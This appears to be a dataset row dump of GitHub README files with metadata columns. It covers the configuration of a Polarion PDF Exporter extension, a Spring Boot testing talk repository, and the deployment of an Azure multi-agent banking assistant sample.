   scriptInjection.dleEditorHead=<script src=""/polarion/pdf-exporter/js/starter.js""></script><script>PdfExporterStarter.injectToolbar();</script>
   ```
   There's an alternate approach adding PDF Exporter button into native Polarion's toolbar, which has a drawback at the moment -
   button disappears in some cases (for example when document is saved), so using this approach is not advisable:
   ```properties
   scriptInjection.dleEditorHead=<script src=""/polarion/pdf-exporter/js/starter.js""></script><script>PdfExporterStarter.injectToolbar({alternate: true});</script>
   ```
5. Save changes by clicking ğŸ’¾ Save

### PDF Exporter view to open in Live Reports

Live Reports also can be converted to PDF with help of this extension.

First of all you need to inject appropriate JavaScript code into Polarion:

1. Open ""Default Repository"".
2. On the top of its navigation pane click âš™ (Actions) â™ ğŸ”§ Administration. Global administration page will be opened.
3. On the administration's navigation pane select Configuration Properties.
4. In editor of opened page add following line:
   ```properties
   scriptInjection.mainHead=<script src=""/polarion/pdf-exporter/js/starter.js""></script>
   ```
5. Save changes by clicking ğŸ’¾ Save

Then open a project, its Live Report you wish to export, and click ""Expand Tools"" on top of the page.
As a result report's toolbar will appear. Click ""Edit"" button in a toolbar, as a result the report will be switched into an edit mode. Add an empty region on top
of the report, place cursor there, choose ""Generic"" tag on ""Widgets"" sidebar on right hand side of the page, find ""Export to PDF Button"" widget there and click it
to add to the report. Then save a report clicking ğŸ’¾ in a toolbar and then return to a view mode clicking ""Back"" button. When you click ""Export to PDF"" button just added
to the report, PDF Exporter view will be opened in a popup and you will be able to proceed with exporting the report to PDF. Be aware that in report's context limited
set of properties are available for configuration in PDF popup, the rest of them are relevant only in Live Document context.

### Configuring logs

For better problem analyses extended logging can be configured in Polarion. By default, Polarion log level is set to INFO. It can be changed to debug in `log4j2.xml` file.
Find `/opt/polarion/polarion/plugins/com.polarion.core.util_<version>/log4j2.xml` file and add the following line into `Loggers`section:
```xml
<Logger name=""ch.sbb.polarion.extension"" level=""debug""/>
```

It is also possible to write all messages of SBB extensions info separate log file which can be useful to report a problem. In this case new `Appender` should be added:
```xml
<RollingFile name=""SBB"" fileName=""${sys:logDir}/log4j-sbb${fileNameSuffix}"" filePattern=""${sys:logDir}/log4j-sbb${filePatternSuffix}"">
    <PatternLayout pattern=""${layoutPattern}""/>
    <Policies>
        <TimeBasedTriggeringPolicy interval=""1""/>
    </Policies>
</RollingFile>
```
and the following `Logger`:
```xml
<Logger name=""ch.sbb.polarion.extension"" level=""debug"">
    <AppenderRef ref=""SBB""/>
</Logger>
```

### Enabling CORS

Cross-Origin Resource Sharing could be enabled using standard configuration of Polarion REST API. In `polarion.properties` the following lines should be added:
```properties
com.siemens.polarion.rest.enabled=true
com.siemens.polarion.rest.cors.allowedOrigins=http://localhost:8888,https://anotherdomain.com
```

### Enabling webhooks

By default, webhooks functionality is not enabled in PDF Exporter. If you want to make it available the following line should be added in `polarion.properties`:
```properties
ch.sbb.polarion.extension.pdf-exporter.webhooks.enabled=true
```

### Debug option

This extension makes intensive HTML processing to extend similar standard Polarion functionality. There is a possibility to log
original and resulting HTML to see potential problems in this processing. This logging can be switched on (`true` value)
and off (`false` value) with help of following property in file `polarion.properties`:

```properties
ch.sbb.polarion.extension.pdf-exporter.debug=true
```

If HTML logging is switched on, then in standard polarion log file there will be following lines:

```text
2023-09-20 08:42:13,911 [ForkJoinPool.commonPool-worker-2] INFO  util.ch.sbb.polarion.extension.pdf_exporter.util.HtmlLogger - Original HTML fragment provided by Polarion was stored in file /tmp/pdf-exporter10000032892830031969/original-4734772539141140796.html
2023-09-20 08:42:13,914 [ForkJoinPool.commonPool-worker-2] INFO  util.ch.sbb.polarion.extension.pdf_exporter.util.HtmlLogger - Final HTML page obtained as a result of PDF exporter processing was stored in file /tmp/pdf-exporter10000032892830031969/processed-5773281490308773124.html
```

Here you can find out in which files HTML was stored.

### Enabling internalization of CSS links

The converting HTML can contain some external CSS links referencing Polarion Server, like:

```html
<link rel=""stylesheet"" href=""/polarion/diff-tool-app/ui/app/_next/static/css/3c374f9daffd361a.css"" data-precedence=""next"">
```

## Extension configuration

1. On the top of the project's navigation pane click âš™ (Actions) â™ ğŸ”§ Administration. Project's administration page will be opened.
2. On the administration's navigation pane select `PDF Export`. There are expandable sub-menus with different configuration options for PDF Exporter.
3. For some of these options (Cover page, Header and Footer, Localization, Webhooks and Filename template) `Quick Help` section available with option short description. For the rest
   (Style package, Stylesheets) there's no `Quick Help` section as their content is self-evident.
4. To change configuration of PDF Exporter extension just edit corresponding section and press `Save` button.

## Usage

1. Open a document in Polarion.
2. In the toolbar choose Show Sidebar â™ Document Properties.
3. Choose desired options in the `PDF Exporter` block and click `Export to PDF`.
   For the options details please refer [plugin documentation](docs/pdf-exporter.pdf).

## REST API
This extension provides REST API. OpenAPI Specification can be obtained [here](docs/openapi.json).

## Advanced configuration

### Asynchronous PDF Export: export jobs timeout
This extension provides REST API to export PDF asynchronously. Using this API, it is possible to start export job, observe their status and get result.
Finished (succeed or failed) and in-progress export jobs will be preserved in memory until configured timeout. To change this timeout, adjust the following property in the local `pdf-converter-jobs.properties` file:
```properties
# Timeout in minutes to keep finished async conversion jobs results in memory
jobs.timeout.finished.minutes=30
# Timeout in minutes to wait until async conversion jobs is finished
jobs.timeout.in-progress.minutes=60
```

## Known issues

All good so far.

## Upgrade

### Upgrade from version 6.x.x to 7.0.0

In version 7.0.0 `/export-filename` REST API endpoint changed. As a result, if the endpoint has been used, it's required to adjust the calls accordingly.
`DocumentType` enum in `ExportParams` has been changed. As a result, if enum values have been used, it's required to adjust the calls accordingly.
Main package has been renamed from `ch.sbb.polarion.extension.pdf.exporter` to `ch.sbb.polarion.extension.pdf_exporter`. As a result, if the extension has been used in another OSGi bundles, it's required to adjust the package imports accordingly.

There was also added a CSS fragment for better display of Test Run pages in PDF, please add this fragment to your CSS definitions if they differ from default one, or update your CSS definitions via UI clicking button ""Default"" and later saving it. Here is this fragment:
```css
#polarion-rp-widget-content > .polarion-TestRunOverviewWidget-table > tbody > tr > td:first-child {
   width: 46% !important;
}
.polarion-TestRunOverviewWidget-buttonName {
   padding-top: 20px;
}
```

### Upgrade from version 5.x.x to 6.0.0

In version 6.0.0 WeasyPrint CLI support was removed. As a result, if WeasyPrint CLI has been using to generate PDFs, it's required to switch to [WeasyPrint Service](#weasyprint-configuration).

### Upgrade from version 4.x.x to 5.0.0
In version 5.0.0 not only label of configuration parameter ""Fit images and tables to page width"" was modified to be ""Fit images and tables to page"",
but also underlying parameter was renamed to reflect this change. As a result if you had ""Fit images and tables to page width"" ticked in your configuration prior to version 5.0.0,
after installation of this version you will have to go to configuration again and re-tick property ""Fit images and tables to page"", both on global repository level and on level of projects.

Another change is default CSS which was modified to reflect different possible paper sizes as well as additional styling for images to jump into next page if they can't be fully displayed on current one.
Thus please either reset your saved CSS into last version if you didn't have your own CSS definitions or merge your saved version with new default version.
",27,2,5,170.0,"['polarion', 'alm', 'extension', 'convert', 'document', 'pdf', 'file', 'quick', 'start', 'build', 'installation', 'polarion', 'polarion', 'configuration', 'weasyprint', 'configuration', 'pdf', 'exporter', 'extension', 'appear', 'document', 'property', 'pane', 'pdf', 'exporter', 'view', 'open', 'via', 'button', 'toolbar', 'pdf', 'exporter', 'view', 'open', 'live', 'report', 'configure', 'log', 'enable', 'cors', 'enable', 'webhooks', 'debug', 'option', 'enable', 'internalization', 'cs', 'link', 'extension', 'configuration', 'usage', 'rest', 'api', 'advanced', 'configuration', 'asynchronous', 'pdf', 'export', 'export', 'job', 'timeout', 'timeout', 'minute', 'keep', 'finish', 'async', 'conversion', 'job', 'result', 'memory', 'timeout', 'minute', 'wait', 'async', 'conversion', 'job', 'finish', 'know', 'issue', 'upgrade', 'upgrade', 'version', 'upgrade', 'version', 'upgrade', 'version']","['pdf', 'configuration', 'upgrade', 'polarion', 'extension']",1.0,[],0.0,1.0,0.0
mvitz/beyond-spring-boot-testing,main,"# Beyond Built-in: Advanced Testing Techniques for Spring Boot Applications

This repository contains all code used for the presentation.

The slides of the presentation can be found
[here](https://www.innoq.com/en/talks/2024/05/beyond-built-in-advanced-testing-techniques-for-spring-boot-applications/).

Additional you can read my article [Testing in Spring Boot applications](https://www.innoq.com/en/articles/2023/10/spring-boot-testing/).
",0,0,1,0.0,"['beyond', 'advanced', 'test', 'technique', 'spring', 'boot', 'application']","['beyond', 'advanced', 'test', 'technique', 'spring']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
Azure-Samples/agent-openai-java-banking-assistant,main,"---
page_type: sample
languages:
- azdeveloper
- java
- bicep
- typescript
- html
products:
- ai-services 
- azure
- azure-openai
- active-directory
- azure-cognitive-search
- azure-container-apps
- azure-sdks
- github
- document-intelligence
- azure-monitor
- azure-pipelines
urlFragment: agent-openai-java-banking-assistant
name: Multi Agents Banking Assistant with Java and Semantic Kernel
description: A Java sample app emulating a personal banking AI-powered assistant to inquire about account balances, review recent transactions, or initiate payments
---
<!-- YAML front-matter schema: https://review.learn.microsoft.com/en-us/help/contribute/samples/process/onboarding?branch=main#supported-metadata-fields-for-readmemd -->
<!-- prettier-ignore -->
<div align=""center"">

![](./docs/assets/robot-agents-small.png)

# Multi Agents Banking Assistant with Java and Semantic Kernel

[![Open project in GitHub Codespaces](https://img.shields.io/badge/Codespaces-Open-blue?style=flat-square&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Build Status](https://img.shields.io/github/actions/workflow/status/azure-samples/agent-openai-java-banking-assistant/azure-dev.yaml?style=flat-square&label=Build)](https://github.com/azure-samples/agent-openai-java-banking-assistant/actions)
![Java version](https://img.shields.io/badge/Java->=17-3c873a?style=flat-square)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)

<!-- [![Watch how to use this sample on YouTube](https://img.shields.io/badge/YouTube-Watch-d95652.svg?style=flat-square&logo=youtube)]() -->

:star: If you like this sample, star it on GitHub â€” it helps a lot!

[Overview](#overview) â€¢ [Architecture](#agents-concepts-and-architectures) â€¢ [Get started](#getting-started) â€¢  [Resources](#resources) â€¢ [FAQ](#faq) â€¢ [Troubleshooting](#troubleshooting)

![](./docs/assets/ui.gif)
</div>

This project is designed as a Proof of Concept (PoC) to explore the innovative realm of generative AI within the context of multi-agent architectures. By leveraging Java and Microsoft Semantic Kernel AI orchestration framework, our aim is to build a chat web app to demonstrate the feasibility and reliability of using generative AI agents to transform user experience from web clicks to natural language conversations while maximizing reuse of the existing workload data and APIs.



## Overview
The core use case of this Proof of Concept (PoC) revolves around a banking personal assistant designed to revolutionize the way users interact with their bank account information, transaction history, and payment functionalities. Utilizing the power of generative AI within a multi-agent architecture, this assistant aims to provide a seamless, conversational interface through which users can effortlessly access and manage their financial data.

Instead of navigating through traditional web interfaces and menus, users can simply converse with the AI-powered assistant to inquire about their account balances, review recent transactions, or initiate payments. This approach not only enhances user experience by making financial management more intuitive and accessible but also leverages the existing workload data and APIs to ensure a reliable and secure service.

Invoices samples are included in the data folder to make it easy to explore payments feature. The payment agent equipped with OCR tools ( Azure Document Intelligence) will lead the conversation with the user to extract the invoice data and initiate the payment process. Other account fake data as transactions, payment methods and account balance are also available to be queried by the user. All data and services are exposed as external REST APIs and consumed by the agents to provide the user with the requested information.

## Features 
This project provides the following features and technical patterns:
 - Simple multi ai agents Java implementation using *gpt-4o-mini* on Azure Open AI.
 - Chat intent extraction and agent routing.
 - Agents tools configuration and automatic tools invocations with [Java Semantic Kernel](https://github.com/microsoft/semantic-kernel-java/).
 - Tools output cache scoped at chat conversation level.It improves functions call planning and parameters extraction for long chat.
 - Chat based conversation implemented as [React Single Page Application](https://react.fluentui.dev/?path=/docs/concepts-introduction--docs) with support for images upload.Supported images are invoices, receipts, bills jpeg/png files you want your virtual banking assistant to pay on your behalf.
 - Images scanning and data extraction with Azure Document Intelligence using [prebuilt-invoice](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/concept-invoice?view=doc-intel-4.0.0) model.
 - Import REST api contracts (OpenAPI yaml files) as agent tools, providing automatic rest client call. It uses code from Java Semantic Kernel [open-api-plugin code sample](https://github.com/microsoft/semantic-kernel-java/tree/main/samples/semantickernel-sample-plugins/semantickernel-openapi-plugin).
 - Add a copilot app side-by-side to your existing business microservices hosted on [Azure Container Apps](https://azure.microsoft.com/en-us/products/container-apps).
 - Automated Azure resources creation and solution deployment leveraging [Azure Developer CLI](https://learn.microsoft.com/en-us/azure/developer/azure-developer-cli/).

For complex agents conversation implementation, read more about [Autogen framework](https://github.com/microsoft/autogen).

### Architecture
![HLA](docs/assets/HLA.png)
The personal banking assistant is designed as a [vertical multi-agent system](./docs/multi-agents/introduction.md), with each agent specializing in a specific functional domain (e.g., account management, transaction history, payments). The architecture consists of the following key components:

- **Copilot Assistant Copilot App (Microservice)**: Serves as the central hub for processing user requests. It's a spring boot application implementing a vertical multi-agent architectures using Java Semantic Kernel to create Agents equipped with tools. in Java the Agent Router to understand user intent from chat interactions and routes the request to the appropriate domain-specific agent.
    - **Agent Router**: Acts as a user proxy, interpreting user intent based on chat inputs and directing the request to the specific domain agent. This component ensures that user queries are efficiently handled by the relevant agent. It uses **IntentExtractor** tool backed by GPT4 model to extract the user intent in a json format. If intent is 'None' clarifying questions are provided. 

    - **Account Agent**: Specializes in handling tasks related to banking account information, credit balance, and registered payment methods. It leverages specific Account service APIs to fetch and manage account-related data. Semantic Kernel HTTP plugin is used to create a tool definition from the rest api yaml contract (Open API specification) and automatically call the HTTP endpoint with input parameters extracted by gpt4 model from the chat conversation.

    - **Transactions Agent**: Focuses on tasks related to querying user bank movements, including income and outcome payments. This agent accesses account api to retrieve accountid and transaction history service to search for transactions and present them to the user.

    - **Payments Agent**: Dedicated to managing tasks related to submitting payments. It interacts with multiple APIs and tools, such as ScanInvoice (backed by Azure Document Intelligence), Account Service to retrieve account and payment methods info, Payment Service to submit payment processing and Transaction History service to check for previous paid invoices.

- **Existing Business APIs**: Interfaces with the backend systems to perform operations related to personal banking accounts, transactions, and invoice payments. These APIs are implemented as external spring boot microservices providing the necessary data and functionality consumed by agents to execute their tasks.
    - **Account Service (Microservice)**: Provides functionalities like retrieving account details by username, fetching payment methods, and getting registered beneficiaries. This microservice supports all 3 agents.

    - **Payments Service (Microservice)**: Offers capabilities to submit payments and notify transactions. It is a critical component for the Payments Agent to execute payment-related tasks efficiently.

    - **Reporting Service (Microservice)**: Enables searching transactions and retrieving transactions by recipient. This service supports the Transactions Agent in providing detailed transaction reports to the user and the Payment Agent as it needs to check if an invoice has not been already paid.

## Getting Started

### Run in GitHub Codespaces or VS Code Dev Containers

You can run this repo virtually by using GitHub Codespaces or VS Code Dev Containers.  Click on one of the buttons below to open this repo in one of those options.

[![Open in GitHub Codespaces](https://img.shields.io/static/v1?style=for-the-badge&label=GitHub+Codespaces&message=Open&color=brightgreen&logo=github)](https://codespaces.new/azure-samples/agent-openai-java-banking-assistant?hide_repo_select=true&ref=main&quickstart=true)
[![Open in VS Code Dev Containers](https://img.shields.io/static/v1?style=for-the-badge&label=Remote%20-%20Containers&message=Open&color=blue&logo=visualstudiocode)](https://vscode.dev/redirect?url=vscode://ms-vscode-remote.remote-containers/cloneInVolume?url=https://github.com/azure-samples/agent-openai-java-banking-assistant/)

All prerequisites are already installed in the container.  You can skip to the [Starting from scratch](#starting-from-scratch) section.

### Prerequisites

* [Java 17](https://learn.microsoft.com/en-us/java/openjdk/download#openjdk-17)
* [Maven 3.8.x](https://maven.apache.org/download.cgi)
* [Azure Developer CLI](https://aka.ms/azure-dev/install)
* [Node.js](https://nodejs.org/en/download/)
* [Git](https://git-scm.com/downloads)
* [Powershell 7+ (pwsh)](https://github.com/powershell/powershell) - For Windows users only.
  * **Important**: Ensure you can run `pwsh.exe` from a PowerShell command. If this fails, you likely need to upgrade PowerShell.


>[!WARNING] Your Azure Account must have `Microsoft.Authorization/roleAssignments/write` permissions, such as [User Access Administrator](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#user-access-administrator) or [Owner](https://learn.microsoft.com/azure/role-based-access-control/built-in-roles#owner).  

### Starting from scratch

You can clone this repo and change directory to the root of the repo. Or you can run `azd init -t Azure-Samples/agent-openai-java-banking-assistant`.

Once you have the project available locally, run the following commands if you don't have any pre-existing Azure services and want to start from a fresh deployment.

1. Run 

    ```shell
    azd auth login
    ```

2. Run 

    ```shell
    azd up
    ```
    
    * This will provision Azure resources and deploy this sample to those resources.
    * The project has been tested with gpt4-o-mini model which is currently available in these regions: **eastus** (Default), **swedencentral**.  For an up-to-date list of regions and models, check [here](https://learn.microsoft.com/en-us/azure/ai-services/openai/concepts/models)
    * The Azure Document Intelligence  new rest API is used which is currently available in these regions: **eastus**(Default), **westus2**, **westeurope**. More info [here](https://learn.microsoft.com/en-us/azure/ai-services/document-intelligence/sdk-overview-v4-0?view=doc-intel-4.0.0&tabs=csharp)

3. After the application has been successfully deployed you will see a web app URL printed to the console.  Click that URL to interact with the application in your browser.  

It will look like the following:

!['Output from running azd up'](docs/assets/azd-success.png)


### Deploying with existing Azure resources

If you already have existing Azure resources, you can re-use those by setting `azd` environment values.

#### Existing resource group

1. Run `azd env set AZURE_RESOURCE_GROUP {Name of existing resource group}`
2. Run `azd env set AZURE_LOCATION {Location of existing resource group (i.e eastus2)}`

#### Existing OpenAI resource

1. Run `azd env set AZURE_OPENAI_SERVICE {Name of existing OpenAI service}`
2. Run `azd env set AZURE_OPENAI_RESOURCE_GROUP {Name of existing resource group that OpenAI service is provisioned to}`
3. Run `azd env set AZURE_OPENAI_SERVICE_LOCATION {Location of existing resource (i.e eastus2)}`. Only needed if your OpenAI resource is in a different location than the one you'll pick for the `azd up` step.
4. Run `azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT {Name of existing ChatGPT deployment}`. Only needed if your ChatGPT deployment is not the default 'gpt4-o-mini'.

#### Existing Azure Document Intelligence

1. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_SERVICE {Name of existing Azure Document Intelligence}`
2. Run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP {Name of existing resource group with Azure Document Intelligence service}`
3. If that resource group is in a different location than the one you'll pick for the `azd up` step,
   then run `azd env set AZURE_DOCUMENT_INTELLIGENCE_RESOURCE_GROUP_LOCATION {Location of existing service}`

#### Other existing Azure resources

You can also use existing Form Recognizer and Storage Accounts. See `./infra/main.parameters.json` for list of environment variables to pass to `azd env set` to configure those existing resources.

#### Provision remaining resources

Now you can run `azd up`, following the steps in [Deploying from scratch](#deploying-from-scratch) above.
That will both provision resources and deploy the code.


### Redeploying

If you've only changed the backend/frontend code in the `app` folder, then you don't need to re-provision the Azure resources. You can just run:

```shell
azd deploy
```

If you've changed the infrastructure files (`infra` folder or `azure.yaml`), then you'll need to re-provision the Azure resources. You can do that by running:

```shell
azd up
```
 > [!WARNING]
 > When you run `azd up` multiple times to redeploy infrastructure, make sure to set the following parameters in `infra/main.parameters.json` to `true` to avoid container apps images from being overridden with default ""mcr.microsoft.com/azuredocs/containerapps-helloworld"" image:

```json
 ""copilotAppExists"": {
      ""value"": false
    },
    ""webAppExists"": {
      ""value"": false
    },
    ""accountAppExists"": {
      ""value"": false
    },
    ""paymentAppExists"": {
      ""value"": false
    },
    ""transactionAppExists"": {
      ""value"": false
    }
```

### Running locally

1. Run

    ```shell
    az login
    ```

2. Change dir to `app`

    ```shell
    cd app
    ```

3. Run the `./start-compose.ps1` (Windows) or `./start-compose.sh` (Linux/Mac) scripts or run the ""VS Code Task: Start App"" to start the project locally.
4. Wait for the docker compose to start all the containers (web, api, indexer) and refresh your browser to [http://localhost](http://localhost)


## Guidance

### Testing different gpt4 models and versions
The default LLM used in this project is *gpt-4o-mini*. It's a cost-efficient small model with enhanced planning, reasoning capabilities which are required by this use case to reliably select the right agent based on the chat conversation and to properly handle tools call.However, in case of long chat or some words, the model might fail sometimes to detect the right user intent especially when he/she asks to pay a bill based on image upload. Based on our tests *gpt4-o* provides better results but it's more expensive and slower. To read more about the models and prices, check [here](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/). 

You can test different models and versions by changing the , `AZURE_OPENAI_CHATGPT_MODEL`, `AZURE_OPENAI_CHATGPT_VERSION` and `AZURE_OPENAI_CHATGPT_DEPLOYMENT` environment variable to the desired model like below:

```shell
azd env set AZURE_OPENAI_CHATGPT_MODEL gpt-4o
azd env set AZURE_OPENAI_CHATGPT_VERSION 2024-05-13
azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT gpt-4o
```
### Enabling Application Insights

Applications Insights is enabled by default. It allows to investigate each request tracing along with the logging of errors.

If you want to disable it set the `AZURE_USE_APPLICATION_INSIGHTS` variable to false before running `azd up`

1. Run `azd env set AZURE_USE_APPLICATION_INSIGHTS false`
1. Run `azd up`

To see the performance data, go to the Application Insights resource in your resource group, click on the ""Investigate -> Performance"" blade and navigate to any HTTP request to see the timing data.
To inspect the performance of chat requests, use the ""Drill into Samples"" button to see end-to-end traces of all the API calls made for any chat request.
Under ""Trace & Events"" panel you can review custom Java informational logs to better understand content of OpenAI requests and responses.

![Tracing screenshot](docs/assets/transaction-tracing.png)

To see any exceptions and server errors, navigate to the ""Investigate -> Failures"" blade and use the filtering tools to locate a specific exception. You can see Java stack traces on the right-hand side.

### Enabling authentication

By default, the web app on ACA will have no authentication or access restrictions enabled, meaning anyone with routable network access to the web app can chat with your personal assistant.You can require authentication to your Microsoft Entra by following the [Add app authentication](https://learn.microsoft.com/en-us/azure/container-apps/authentication) tutorial and set it up against the deployed web app.


To then limit access to a specific set of users or groups, you can follow the steps from [Restrict your Microsoft Entra app to a set of users](https://learn.microsoft.com/entra/identity-platform/howto-restrict-your-app-to-a-set-of-users) by changing ""Assignment Required?"" option under the Enterprise Application, and then assigning users/groups access.  Users not granted explicit access will receive the error message -AADSTS50105: Your administrator has configured the application <app_name> to block users 

### App Continuous Integration with GitHub Actions

1. **Create a Service Principal for the github action pipeline**

    Use [az ad sp create-for-rbac](https://learn.microsoft.com/en-us/cli/azure/ad/sp#az_ad_sp_create_for_rbac) to create the service principal:
    
    ```bash
    groupId=$(az group show --name <resource-group-name>  --query id --output tsv)
    az ad sp create-for-rbac --name ""agent-openai-java-banking-assistant-pipeline-spi"" --role contributor --scope $groupId --sdk-auth
    ```
    Output is similar to:
    
    ```json
    {
    ""clientId"": ""xxxx6ddc-xxxx-xxxx-xxx-ef78a99dxxxx"",
    ""clientSecret"": ""xxxx79dc-xxxx-xxxx-xxxx-aaaaaec5xxxx"",
    ""subscriptionId"": ""xxxx251c-xxxx-xxxx-xxxx-bf99a306xxxx"",
    ""tenantId"": ""xxxx88bf-xxxx-xxxx-xxxx-2d7cd011xxxx"",
    ""activeDirectoryEndpointUrl"": ""https://login.microsoftonline.com"",
    ""resourceManagerEndpointUrl"": ""https://management.azure.com/"",
    ""activeDirectoryGraphResourceId"": ""https://graph.windows.net/"",
    ""sqlManagementEndpointUrl"": ""https://management.core.windows.net:8443/"",
    ""galleryEndpointUrl"": ""https://gallery.azure.com/"",
    ""managementEndpointUrl"": ""https://management.core.windows.net/""
    } 
    ```
    
    Save the JSON output because it is used in a later step. Also, take note of the clientId, which you need to update the service principal in the next section.

2. **Assign ACRPush permission to service Principal**
   
   This step enables the GitHub workflow to use the service principal to [authenticate with your container registry](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-auth-service-principal) and to push a Docker image.
   Get the resource ID of your container registry. Substitute the name of your registry in the following az acr show command:
   ```bash
   registryId=$(az acr show --name <registry-name> --resource-group <resource-group-name> --query id --output tsv)
    ```

   Use [az role assignment create](https://learn.microsoft.com/en-us/cli/azure/role/assignment#az_role_assignment_create) to assign the AcrPush role, which gives push and pull access to the registry. Substitute the client ID of your service principal:
   ```bash
   az role assignment create --assignee <ClientId> --scope $registryId --role AcrPush
   ```

3. **Add the service principal to your GitHub environment secrets**

 - Go to your forked repository in GitHub and create an [environment]((https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)) called 'Development' (yes this is the exact name; don't change it). If you want to change the environment name (also adding new branches and environments, change the current branch/env mapping) you can do that, but make sure to change the pipeline code accordingly in `.github/workflows/azure-dev.yml`.
 - Create 'Development' environment [secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository) as below:
    | Secret                | Value                                                                                      |
    |-----------------------|--------------------------------------------------------------------------------------------|
    | AZURE_CREDENTIALS     | The entire JSON output from the service principal creation step                            |
    | SPI_CLIENT_ID         | The service principal client id used as username to login to Azure Container Registry      |
    | SPI_CLIENT_SECRET     | The service principal client secret used as password to login to Azure Container Registry  |
 - Create 'Development' [environment variables](https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-an-environment) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACR_NAME                  | The name of the Azure Container registry                                                   |
    | RESOURCE_GROUP            | The name of the resource group where your Azure Container Environment has been deployed    |
 - Create [repository variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#creating-configuration-variables-for-a-repository) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACA_DEV_ENV_NAME                  | The name of the Azure Container Apps Environment                                       |
    | COPILOT_ACA_DEV_APP_NAME      | The container app name for the copilot orchestrator app                                    |
    | WEB_ACA_DEV_APP_NAME          | The container app name for the web frontend  app                                           |
    | ACCOUNTS_ACA_DEV_APP_NAME     | The container app name for the business account api                                        |
    | PAYMENTS_ACA_DEV_APP_NAME     | The container app name for the business payment api                                        |
    | TRANSACTIONS_ACA_DEV_APP_NAME | The container app name for the business payment api                                        |


### Cost estimation

Pricing varies per region and usage, so it isn't possible to predict exact costs for your usage.
However, you can try the [Azure pricing calculator](https://azure.com/e/8ffbe5b1919c4c72aed89b022294df76) for the resources below.

- Azure Containers App: Consumption workload profile with 4 CPU core and 8 GB RAM. Pricing per vCPU and Memory. [Pricing](https://azure.microsoft.com/en-us/pricing/details/container-apps/)
- Azure OpenAI: Standard tier, ChatGPT and Ada models. Pricing per 1K tokens used, and at least 1K tokens are used per question. [Pricing](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/)
- Azure Document Intelligence: SO (Standard) tier using pre-built layout. [Pricing](https://azure.microsoft.com/pricing/details/form-recognizer/)

- Azure Blob Storage: Standard tier with ZRS (Zone-redundant storage). Pricing per storage and read operations. [Pricing](https://azure.microsoft.com/pricing/details/storage/blobs/)
- Azure Monitor: Pay-as-you-go tier. Costs based on data ingested. [Pricing](https://azure.microsoft.com/pricing/details/monitor/)

The first 180,000 vCPU-seconds, 360,000 GiB-seconds, and 2 million requests each month are free for ACA. To reduce costs, you can switch to free SKUs Document Intelligence by changing the parameters file under the `infra` folder. There are some limits to consider; for example, the free resource only analyzes the first 2 pages of each document. 

âš ï¸ To avoid unnecessary costs, remember to take down your app if it's no longer in use,
either by deleting the resource group in the Portal or running `azd down`.


## Resources

Here are some resources to learn more about multi-agent architectures and technologies used in this sample:

- [Generative AI For Beginners](https://github.com/microsoft/generative-ai-for-beginners)
- [Azure OpenAI Service](https://learn.microsoft.com/azure/ai-services/openai/overview)
- [Semantic Kernel for Java](https://devblogs.microsoft.com/semantic-kernel/java-1-0-release-candidate-for-semantic-kernel-now-available/)
- [OpenAI's Bet on a Cognitive Architecture](https://blog.langchain.dev/openais-bet-on-a-cognitive-architecture/)
- [THE LANDSCAPE OF EMERGING AI AGENT ARCHITECTURES FOR REASONING, PLANNING, AND TOOL CALLING: A SURVEY](https://arxiv.org/pdf/2404.11584)
- [MicroAgents: Exploring Agentic Architecture with Microservices](https://devblogs.microsoft.com/semantic-kernel/microagents-exploring-agentic-architecture-with-microservices/)
- [Chat + Enterprise data with Azure OpenAI and Azure AI Search](https://github.com/Azure-Samples/azure-search-openai-java)
- [SK Agents Overview and High Level Design (.net)](https://github.com/microsoft/semantic-kernel/blob/ec26ce7cb70f933b52a62f0a4e1c7b98c49d590e/docs/decisions/0032-agents.md#usage-patterns)

You can also find [more Azure AI samples here](https://github.com/Azure-Samples/azureai-samples).

## FAQ

You can find answers to frequently asked questions in the [FAQ](./docs/faq.md).

## Troubleshooting

If you have any issue when running or deploying this sample, please check the [troubleshooting guide](./docs/troubleshooting.md). If you can't find a solution to your problem, please [open an issue](https://github.com/Azure-Samples/agent-openai-java-banking-assistant/issues) in this repository.

## Contributing

This project welcomes contributions and suggestions. Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow
[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.
